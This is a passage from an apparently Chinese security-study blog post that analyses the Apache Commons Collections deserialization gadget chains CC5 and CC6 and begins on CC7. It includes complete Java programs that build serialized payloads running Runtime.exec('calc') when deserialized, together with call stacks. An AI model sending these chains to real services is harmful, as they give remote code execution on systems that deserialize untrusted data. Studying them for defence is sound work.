function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.map.get(<span class="hljs-built_in">this</span>.key);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>综上，通过 TiedMapEntry.toString() 可触发 LazyMap.get()</p><p>BadAttributeValueExpException可以在反序列化时触发 TiedMapEntry.toString()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadAttributeValueExpException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span>   &#123;<br>    <span class="hljs-keyword">private</span> Object val;     <span class="hljs-comment">//这里可以控制 val 为 TiedMapEntry</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>            val = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();    <span class="hljs-comment">//这里是关键点，调用toString()</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Apache_Common_Collections.cc_1_7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections5</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//Transformer数组</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//ChainedTransformer实例</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//LazyMap实例</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">uselessMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);<br><br>        <span class="hljs-comment">//TiedMapEntry 实例</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">//BadAttributeValueExpException 实例</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//反射设置 val</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException, tiedMapEntry);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.flush();<br>        oos.close();<br><br>        <span class="hljs-comment">//测试反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>大体调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">-&gt;BadAttributeValueExpException.readObject()<br>      -&gt;TiedMapEntry.toString()<br>          -&gt;TiedMapEntry.getValue()<br>            -&gt;LazyMap.get()<br>                -&gt;ChainedTransformer.transform()<br>                    -&gt;ConstantTransformer.transform()<br>                            -&gt;InvokerTransformer.transform()<br>                                -&gt;…………<br></code></pre></td></tr></table></figure><h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p><p>用HashMap触发LazyMap.get()</p><p>再研究研究 TiedMapEntry 这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Entry</span>, KeyValue, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8453869361373831205L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-comment">//构造函数，显然我们可以控制 this.map 为 LazyMap</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br><br>    <span class="hljs-comment">//hashCode函数，注意这里调用了 getValue()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br><br>    <span class="hljs-comment">//跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.map.get(<span class="hljs-built_in">this</span>.key);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化时触发 TiedMapEntry.hashCode()需要用到HashMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br><br>    <span class="hljs-comment">//先看看其 readObject</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        …………<br>         <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>            putForCreate(key, value);<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//跟进 putForCreate 方法</span><br>     <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">putForCreate</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span> == key ? <span class="hljs-number">0</span> : hash(key); <span class="hljs-comment">//关键点，我们可以控制 key 为TiedMapEntry，然后计算hash(TiedMapEntry)</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> indexFor(hash, table.length);<br><br>         …………<br><br>        createEntry(hash, key, value, i);<br>    &#125;<br><br>    <span class="hljs-comment">//跟进 hash 方法</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object k)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hashSeed;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != h &amp;&amp; k <span class="hljs-keyword">instanceof</span> String) &#123;<br>            <span class="hljs-keyword">return</span> sun.misc.Hashing.stringHash32((String) k);<br>        &#125;<br><br>        h ^= k.hashCode();  <span class="hljs-comment">//关键点，触发 TiedMapEntry.hashCode()</span><br>        …………<br>    &#125;<br></code></pre></td></tr></table></figure><p>最终代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Apache_Common_Collections.cc_1_7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        Transformer[] fakeTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//ChainedTransformer实例</span><br>        <span class="hljs-comment">//先设置假的 Transformer 数组，防止生成时执行命令</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformer);<br><br>        <span class="hljs-comment">//LazyMap实例</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">uselessMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);<br><br>        <span class="hljs-comment">//TiedMapEntry 实例</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry, <span class="hljs-string">&quot;test&quot;</span>);<br><br><br>        <span class="hljs-comment">//通过反射设置真的 ransformer 数组</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br>        <span class="hljs-comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span><br>        lazyMap.clear();<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashMap);<br>        oos.flush();<br>        oos.close();<br><br>        <span class="hljs-comment">//测试反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>大体调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同</span><br>  -&gt;HashMap.readObject()<br>      -&gt;HashMap.putForCreate()<br>          -&gt;HashMap.hash()<br>            -&gt;TiedMapEntry.hashCode()<br>                    -&gt;TiedMapEntry.getValue()<br>                    -&gt;LazyMap.get()<br>                      -&gt;ChainedTransformer.transform()<br>                          -&gt;ConstantTransformer.transform()<br>                              -&gt;InvokerTransformer.transform()<br>                                  -&gt;…………<br></code></pre></td></tr></table></figure><h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p><p>这里仍然是想法子触发LazyMap.get()。Hashtable 的 readObject 中. 遇到 hash 碰撞时, 通过调用一个对象的 equals 方法对比两个对象判断是真的 hash 碰撞. 这里的 equals 方法是 AbstractMap 的 equals 方法。</p><p>Hashtable 类的关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Hashtable 的 readObject 方法</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>         <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>       ………………<br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br><br>            <span class="hljs-comment">//reconstitutionPut方法</span><br>            reconstitutionPut(newTable, key, value);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.table = newTable;<br>    &#125;<br><br><br><span class="hljs-comment">//跟进 reconstitutionPut 方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hash(key);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>        <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br><br>            <span class="hljs-comment">//注意这里的 equals 方法</span><br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Creates the new entry.</span><br>        Entry&lt;K,V&gt; e = tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进上面的 equals 方法，发现最终调用了 AbstractMap 类的 equals 方法，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032255270.png" alt="image-20230124185509605"></p><blockquote><p>就是在这里触发了 LazyMap.get()。</p></blockquote><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 